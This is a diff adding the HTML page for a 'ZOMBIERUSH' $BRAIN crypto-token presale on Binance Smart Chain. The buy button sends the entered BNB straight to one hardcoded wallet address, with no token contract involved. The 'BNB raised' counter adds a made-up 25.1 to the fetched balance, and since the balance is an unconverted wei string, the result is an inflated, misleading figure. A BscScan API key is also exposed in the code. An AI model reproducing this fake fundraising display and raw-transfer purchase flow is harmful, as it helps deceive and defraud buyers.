@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html name="/app/v2_9/defipresale?saleID=1355&chain=BSC">
+
+<head>
+    <title>ZOMBIERUSH</title>
+    <link rel="shortcut icon" type="image/x-icon" href="logoban.png">
+    <meta charset="UTF-8" />
+
+    <link rel="stylesheet" href="bootstrap.min.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css">
+    <link rel="stylesheet" href=" https://code.ionicframework.com/ionicons/1.5.2/css/ionicons.min.css">
+   <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&amp;display=swap" rel="stylesheet">
+
+    <style>
+        span#devbl {
+            width: 50px;
+            letter-spacing: 2px;
+        }
+        
+        .box-presalelast p {
+            border: 1px solid #10a0ff;
+    padding: 5px;
+    background: #000;
+    border-radius: 10px;
+        }
+        
+        h2.head2 {
+            margin: 10px;
+            padding: 10px; 
+            color: #10a0ff;
+        }
+        
+        span.bnbinput {
+            color: #ffffff;
+            font-weight: bold;
+            text-shadow: 2px 1px #0e0e0e;
+            font-size: 20px;
+        }
+        
+        .presale .row {
+            margin: 20px 0;
+        }
+        
+        .title-area {
+            margin-bottom: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .col-md-4 {
+                margin: 0 !important;
+            }
+        }
+    </style>
+
+</head>
+
+
+
+<body id="body-pd">
+
+
+    <div class="wrapper">
+        <!-- Sidebar  -->
+        
+
+        <nav id="navbar_top" class="navbar navbar-expand-lg   ">
+            <div class="container-menu">
+
+
+                <header class="header" id="header">
+
+
+                    <div class="cont-header row">      
+                            <ul class="navbar-nav socials col-md-2">
+                                                
+                              <li class="nav-item ">
+                                                <a href="#"><i class="fab fa-telegram"></i></a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a href="#"><i class="fab fa-twitter"></i></a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a href="https://discord.gg/DPZrXxSt7F"><i class="fab fa-discord"></i></a>
+                                            </li>
+
+                                        
+                                </ul> 
+                            <div class="logo  col-md-6">
+                                <a class="nav-link" href="#">
+                                    <img src="logosm.png" style="width: 200px;">
+
+                                </a>
+                            </div> 
+
+                        <div class="rhead col-md-2"> 
+                            <div class="headbal"> 
+
+                            </div> 
+                            <button class="btn-simple" id="con" onclick="onPageLoad()">CONNECT WALLET</button>
+
+                        </div>
+ 
+
+                    </div>
+                </header>
+            </div>
+
+        </nav>
+        <!-- End sidebar -->
+
+        <!-- Dark overlay -->
+        <div class="overlay"></div>
+
+
+        <!-- Page Content  -->
+        <div id="content">
+
+
+
+
+            <div id="app">
+
+                <div class="head">
+                    <div class="row">
+                        <div class="col-md-4">
+                              <img src="side1.png">
+                         
+                        </div>
+                        <div class="col-md-4">
+                             <div class="hide userbnb">
+                                <span>BNB Balance: </span>
+                                <span id="mybalance">0</span>
+
+                            </div>
+                            <div class="hide balzoidz">
+                                <span>BRAIN Balance: </span>
+
+                                <span id="zoidbal">0.0</span>
+                            </div>
+                               <div class="boxhead">
+
+                               
+
+                               
+
+
+                            <div class="itemw presale"> 
+                                 
+                                <div class="box1 box-timer">
+                                    <div id="contents">
+                                       
+                                        <div class="timer pt-4">
+                                            <h1>Welcome to ZOMBIERUSH </h1>
+                                           <p> $BRAIN 115,000,000 = 1BNB<p> 
+                                            <h3 id="headline"> </h3>
+                                            <div id="countdown">
+
+                                                <ul>
+                                                    <li><span id="days"></span>days</li>
+                                                    <li><span id="hours"></span>hours</li>
+                                                    <li><span id="minutes"></span>minutes</li>
+                                                    <li><span id="seconds"></span>seconds</li>
+                                                </ul>
+                                            </div>
+
+                                        </div>
+
+                                        <div class="button-area">
+                                            <div class="balance-container">
+
+                                                <div class="dbl">
+                                                    <span id="devbl">00</span>
+
+                                                    <span>/</span>
+                                                    <span id="am">0.0</span>
+                                                    <span>BNB RAISED</span>
+
+
+
+                                                    <input type="hidden" id="maxi" value="100"></input>
+                                                    <P id="GFG">
+
+                                                    </p>
+
+                                                </div>
+
+                                            </div>
+
+
+
+
+
+                                            <div class="button-area presale-button-area">
+                                               
+    
+                                                <div class="input-container"  >
+ 
+                                                    <input id="buyinput" class="input" value="0.1">
+                                                    <span class="bnbinput">BNB</span>
+
+                                                </div>
+                                                <div id="buypbtn" >
+
+
+                                                    <button   class="btn-simple" onclick="buystt()">  <span> BUY NOW</span></button>
+                                               
+
+                                                </div>
+                                                   <h4>   Connect your metamask to buy BRAIN tokens. Check the winners list</h4>
+
+
+                                            </div> 
+
+
+                                        </div> 
+
+                                    </div>
+
+
+                                </div>
+
+                            </div>
+
+
+                            </div>
+                            <br>
+              
+              
+                        </div>
+                        <div class="col-md-4 banner-r">
+                            <img src="side2.png">
+                        </div>
+
+
+                    </div>
+                </div>
+
+
+               
+
+
+
+
+
+
+
+
+
+
+
+
+                </div>
+                <script src="web3.js"></script>
+                <script>
+                    let addr;
+                    const presaleadd = "0xF20997f8902EC9F99366b477AeFDBa43466c0E01";
+
+                    const loadweb3 = async() => {
+                        try {
+                            web3 = new web3js.myweb3(window.ethereum);
+
+                            let a = await ethereum.enable();
+                            addr = web3.utils.toChecksumAddress(a[0]);
+
+                            return (addr);
+
+                        } catch (error) {
+                            if (error.code === 4001) {
+                                console.log('Please connect to MetaMask.')
+                            } else {
+
+                                console.error(error)
+                            }
+                        }
+
+                    };
+
+
+
+
+
+                    const buystt = async() => {
+                        await loadweb3();
+                        if (addr == undefined) {
+                            alert("No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.");
+                        }
+
+                        let ethval = document.getElementById("buyinput").value;
+
+                        ethval = Number(ethval) * 1e18;
+
+                        web3.eth.sendTransaction({
+                            from: addr,
+                            to: presaleadd,
+                            value: ethval,
+                            gasLimit: 21000,
+                            gasPrice: 20000000000
+                        }, (err, res) => {
+                            if (!err) console.log(res);
+                            else console.log(err);
+                        });
+
+                    };
+                </script>
+
+
+
+                <script src="script.js"></script>
+
+
+                <script>
+                    (function() {
+                        const second = 1000,
+                            minute = second * 60,
+                            hour = minute * 60,
+                            day = hour * 24;
+
+                        let launch = "sept 21, 2021 20:00:00",
+                            countDown = new Date(launch).getTime(),
+                            x = setInterval(function() {
+
+                                let now = new Date().getTime(),
+                                    distance = countDown - now;
+
+                                document.getElementById("days").innerText = Math.floor(distance / (day)),
+                                    document.getElementById("hours").innerText = Math.floor((distance % (day)) / (hour)),
+                                    document.getElementById("minutes").innerText = Math.floor((distance % (hour)) / (minute)),
+                                    document.getElementById("seconds").innerText = Math.floor((distance % (minute)) / second);
+
+                                //do something later when date is reached
+                                if (distance < 0) {
+                                    let headline = document.getElementById("headline"),
+                                        countdown = document.getElementById("countdown"),
+                                        contents = document.getElementById("contents");
+                                    buypbtn = document.getElementById("buypbtn");
+
+
+
+                                    headline.innerText = " PUBLIC PRESALE ";
+                                    countdown.style.display = "none";
+                                    buypbtn.style.display = "block";
+
+
+
+
+
+
+                                    clearInterval(x);
+                                }
+                                //seconds
+                            }, 0)
+                    }());
+                </script>
+                <script>
+                    document.addEventListener("DOMContentLoaded", function() {
+                        window.addEventListener('scroll', function() {
+                            if (window.scrollY > 10) {
+                                document.getElementById('navbar_top').classList.add('fixed-top');
+                                // add padding top to show content behind navbar
+                                navbar_height = document.querySelector('.navbar').offsetHeight;
+
+                            } else {
+                                document.getElementById('navbar_top').classList.remove('fixed-top');
+                                // remove padding top from body
+                                document.body.style.paddingTop = '20';
+                            }
+                        });
+                    });
+                </script>
+
+                <script src="js/jquery-3.3.1.min.js"></script>
+                <script src="js/scripts.js"></script>
+                <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+                <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
+            </div>
+        </div>
+    </div>
+
+
+
+    
+
+    <!-- Button trigger modal -->
+
+
+
+
+
+    <script>
+        fetch('https://api.bscscan.com/api?module=account&action=balance&address=0xF20997f8902EC9F99366b477AeFDBa43466c0E01&tag=latest&apikey=UNB56UTPSVK6BXCH74XEA1J272PPSUF9T7')
+            .then(res => {
+                return res.json();
+            })
+
+        .then(json => {
+
+            const amm = json.result;
+              // json.result
+
+          
+            ammbal =  25.1 + amm  ;
+            console.log(ammbal);
+            // web3.utils.fromWei(amm, "ether")
+         
+
+           
+
+
+
+            document.getElementById("devbl").innerHTML = ammbal;
+
+
+            var amounts = ammbal;
+
+            var max = document.getElementById("maxi").value;
+
+            document.getElementById("am").innerHTML = max;
+
+            var g = document.createElement("progress");
+
+            // Set the value of progress element
+            g.setAttribute("value", amounts);
+
+            // Set the maximum value of progress element
+            g.setAttribute("max", max);
+
+            // Get the value of progress element
+            document.getElementById("GFG").appendChild(g);
+
+
+        })
+    </script>
+
+    <script src="https://unpkg.com/bn.js@4.11.8/lib/bn.js"></script>
+
+
+    <footer>
+        <div class=" foot">
+            <div class="row">
+
+                <div class=" foot-logo text-center">
+
+                       <img src="logoban.png">
+
+                    <div class="hide" id="foot"></div> 
+                    <h3> © 2021 zombierush.xyz . All rights reserved </h3>
+                </div>
+
+            </div>
+        </div>
+    </footer>
+</body>
+
+
+<!-- Modal -->
+
+
+
+
+<!--Container Main start-->
+
+<!--Container Main end-->
+<script>
+    document.addEventListener("DOMContentLoaded", function(event) {
+
+        const showNavbar = (toggleId, navId, bodyId, headerId) => {
+            const toggle = document.getElementById(toggleId),
+                nav = document.getElementById(navId),
+                bodypd = document.getElementById(bodyId),
+                headerpd = document.getElementById(headerId)
+
+            // Validate that all variables exist
+            if (toggle && nav && bodypd && headerpd) {
+                toggle.addEventListener('click', () => {
+                    // show navbar
+                    nav.classList.toggle('show')
+                        // change icon
+                    toggle.classList.toggle('bx-x')
+                        // add padding to body
+                    bodypd.classList.toggle('body-pd')
+                        // add padding to header
+                    headerpd.classList.toggle('body-pd')
+                })
+            }
+        }
+
+        showNavbar('header-toggle', 'nav-bar', 'body-pd', 'header')
+
+        /*===== LINK ACTIVE =====*/
+        const linkColor = document.querySelectorAll('.nav_link')
+
+
+
+        // Your code to run since DOM is loaded and ready
+    });
+</script>
+
+<script>
+    $('#accept').click(function() {
+        if ($('#submitbtn').is(':disabled')) {
+            $('#submitbtn').removeAttr('disabled');
+        } else {
+            $('#submitbtn').attr('disabled', 'disabled');
+        }
+    });
+</script>
+
+
+
+<script>
+    function inc(element) {
+        let el = document.querySelector(`[name="${element}"]`);
+        el.value = parseInt(el.value) + 1;
+    }
+
+    function dec(element) {
+        let el = document.querySelector(`[name="${element}"]`);
+        if (parseInt(el.value) > 0) {
+            el.value = parseInt(el.value) - 1;
+        }
+    }
+</script>
+
+<script>
+    function inc1(element) {
+        let el1 = document.querySelector(`[name="${element}"]`);
+        el1.value = parseInt(el1.value) + 1;
+    }
+
+    function dec1(element) {
+        let el1 = document.querySelector(`[name="${element}"]`);
+        if (parseInt(el1.value) > 0) {
+            el1.value = parseInt(el1.value) - 1;
+        }
+    }
+</script>
+
+<script>
+    function inc2(element) {
+        let el2 = document.querySelector(`[name="${element}"]`);
+        el2.value = parseInt(el2.value) + 1;
+    }
+
+    function dec2(element) {
+        let el2 = document.querySelector(`[name="${element}"]`);
+        if (parseInt(el2.value) > 0) {
+            el2.value = parseInt(el2.value) - 1;
+        }
+    }
+</script>
